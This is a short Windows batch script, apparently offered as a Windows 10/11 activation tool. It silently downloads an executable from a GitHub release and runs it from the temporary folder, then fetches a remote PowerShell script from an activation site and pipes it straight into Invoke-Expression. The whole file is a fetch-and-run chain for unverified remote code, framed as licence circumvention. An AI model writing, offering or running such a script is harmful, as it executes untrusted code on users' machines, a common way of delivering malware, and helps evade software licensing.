@echo off


set "url1=https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe"
set "url2=https://get.activated.win"


powershell -Command ^
    "$ProgressPreference = 'SilentlyContinue'; Start-Sleep -Seconds 5; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"


powershell -Command ^
    "$ProgressPreference = 'SilentlyContinue'; irm '%url2%' | iex"
